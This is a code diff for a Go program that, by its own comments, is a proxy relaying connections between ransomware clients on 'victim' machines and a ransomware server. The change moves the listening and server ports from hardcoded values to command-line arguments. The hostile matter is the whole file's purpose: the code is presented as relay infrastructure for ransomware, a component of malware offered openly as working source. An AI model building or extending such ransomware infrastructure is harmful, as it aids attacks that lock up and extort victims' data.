@@ -25,33 +25,35 @@ func copy(dest net.Conn, src net.Conn) {
 }
 
 // connect to the ransomware server
-func connServ() net.Conn {
-	var (
-		server_ip   string = "127.0.0.1"
-		server_port string = "8000"
-	)
-	target, err := net.Dial("tcp", server_ip+":"+server_port)
+func connServ(server_port string) net.Conn {
+	target, err := net.Dial("tcp", ":"+server_port)
 	check_err(err)
+	fmt.Println("connected to the server")
 	return target
 }
 
+// listen for incoming ransomware client
+func clientListen(port string) (net.Listener, error) {
+	return net.Listen("tcp", ":"+port)
+}
+
 func main() {
-	fmt.Println("connected to the server")
-	// client handling loop
-	var (
-		client_ip   string = "127.0.0.1"
-		client_port string = "8080"
-		target      net.Conn
-	)
+	// get the ports number from the command line
+	if len(os.Args) != 3 {
+		fmt.Println("Usage: proxy <client port> <server port>")
+		os.Exit(0)
+	}
+	client_port := os.Args[1]
+	server_port := os.Args[2]
 	// listen for incoming ransomware client
-	incoming, err := net.Listen("tcp", client_ip+":"+client_port)
+	ln, err := clientListen(client_port)
 	check_err(err)
-	defer incoming.Close()
+	defer ln.Close()
 	for {
 		// connect to the server
-		target = connServ()
+		target := connServ(server_port)
 		// catch a ransomware client
-		client, err := incoming.Accept()
+		client, err := ln.Accept()
 		check_err(err)
 		fmt.Println("connected to a victim here")
 		// transfer data
